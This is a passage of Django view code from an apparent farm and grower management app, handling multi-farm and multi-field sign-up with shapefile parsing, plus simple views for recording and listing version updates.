                                
                if int(farm_counter) > 1 :
                    for i in range(1,int(farm_counter)+1):
                        try:
                            loop_farm_name = request.POST.get('farm_name_{}'.format(i))
                            loop_farm_address = request.POST.get('farm_address_{}'.format(i))
                            loop_farm_crop = request.POST.get('farm_crop_{}'.format(i))
                            loop_farm_city = request.POST.get('farm_city_{}'.format(i))
                            loop_farm_state = request.POST.get('farm_state_{}'.format(i))
                            loop_farm_zip_code = request.POST.get('farm_zip_code_{}'.format(i))
                            loop_farm_Nutrien_Id = request.POST.get('farm_Nutrien_Id_{}'.format(i))
                            if loop_farm_name :
                                loop_check_farm = Farm.objects.filter(name=loop_farm_name)
                                if loop_check_farm.exists() :
                                    context['error_msg'] = "Farm name already Exixts"
                                    try:
                                        save_grower.delete()
                                    except:
                                        pass
                                    try:
                                        user.delete()
                                    except:
                                        pass
                                    return render (request,'update-step-form/step.html',context)
                                else:
                                    loop_var_zipcode = loop_farm_zip_code if loop_farm_zip_code else None
                                    save_farm = Farm(name=loop_farm_name,grower_id=save_grower.id,land_type=loop_farm_crop,state=loop_farm_state,
                                                village=loop_farm_city,zipcode=loop_var_zipcode,nutrien_account_id=loop_farm_Nutrien_Id,
                                                town=loop_farm_address,cultivation_year=field_cultivation_year)
                                    save_farm.save()
                        except:
                            pass
                if int(field_counter) > 1 :
                    for i in range(1,int(field_counter)+1):
                        try:
                            select_farm_for_field_2 = request.POST.get('select_farm_for_field_{}'.format(i))
                            field_name_2 = request.POST.get('field_name_{}'.format(i))
                            field_acreage_2 = request.POST.get('field_acreage_{}'.format(i))
                            field_cultivation_year_2 = request.POST.get('field_cultivation_year_{}'.format(i))
                            field_FSA_Farm_number_2 = request.POST.get('field_FSA_Farm_number_{}'.format(i))
                            field_FSA_Track_number_2 = request.POST.get('field_FSA_Track_number_{}'.format(i))
                            field_FSA_Field_number_2 = request.POST.get('field_FSA_Field_number_{}'.format(i))
                            field_shape_file_2 = request.FILES.get('field_shape_file_{}'.format(i))
                            loop_check_filed = Field.objects.filter(name=field_name_2)
                            if loop_check_filed.exists():
                                context['error_msg'] = "Field name already Exixts"
                                try:
                                    save_grower.delete()
                                except:
                                    pass
                                try:
                                    user.delete()
                                except:
                                    pass
                                return render (request,'update-step-form/step.html',context)
                            else:
                                var_select_farm_for_field_2 = Farm.objects.get(name=select_farm_for_field_2)
                                loop_save_field = Field(name=field_name_2,grower_id=save_grower.id,farm_id=var_select_farm_for_field_2.id,acreage=field_acreage_2,fsa_farm_number=field_FSA_Farm_number_2,
                                                fsa_tract_number=field_FSA_Track_number_2,fsa_field_number=field_FSA_Field_number_2,crop=var_select_farm_for_field_2.land_type)
                                                
                                loop_save_field.save()
                                # ShapeFile Data Add
                                if field_shape_file_2 :
                                    sf = shapefile.Reader(field_shape_file_2.temporary_file_path())
                                    # Reading shapeFile id & update fields eschlon_id point 
                                    features = sf.shapeRecords()
                                    for feat in features:
                                        eschlon_id = feat.record["id"]
                                    Field.objects.filter(id=loop_save_field.id).update(eschlon_id=eschlon_id)
                                    rec = sf.shapeRecords()[0]
                                    points = rec.shape.points
                                    lat_lon_set = reverseTuple(points)
                                    chk_poly_data = ShapeFileDataCo.objects.filter(field_id=loop_save_field.id)
                                
                                    if chk_poly_data.count() == 0:

                                        shape_file_data = ShapeFileDataCo(
                                            coordinates=lat_lon_set, field_id=loop_save_field.id)
                                        shape_file_data.save()
                        except:
                            pass

                # context['sus_msg'] = 'Sign Up done successfully!'
                return redirect ('dashboard')
            except Exception as e:
                context['error_msg'] = f'Please Sign Up Again!'
                print(e) 
                try:
                    User.objects.get(email=username).delete()
                except:
                    pass
                try:
                    Grower.objects.get(name=grower_name).delete()
                except:
                    pass
                
    return render (request,'update-step-form/step.html',context)

@login_required()
def version_update(request):
    context = {}
    if request.user.is_superuser or 'SubAdmin' in request.user.get_role() or 'SuperUser' in request.user.get_role() or 'Version Update' in request.user.get_role_perm():
        
        if request.method == "POST":
            version = request.POST.get("version")
            release_date = request.POST.get("release_date")
            print(release_date)
            description = request.POST.get("description")            
            updated_version = VersionUpdate.objects.create(version=version,release_date=release_date, description=description, created_by=request.user.username)
           
            return redirect('version_update_list')
        return render(request, "accounts/version_update.html", context)


@login_required()
def version_update_list(request):
    context = {}
    version_updates = VersionUpdate.objects.all().values("version", "release_date", "description", "created_by", "updated_users")
    context["version_updates"] = version_updates
    return render(request, "accounts/version_updates_list.html", context)


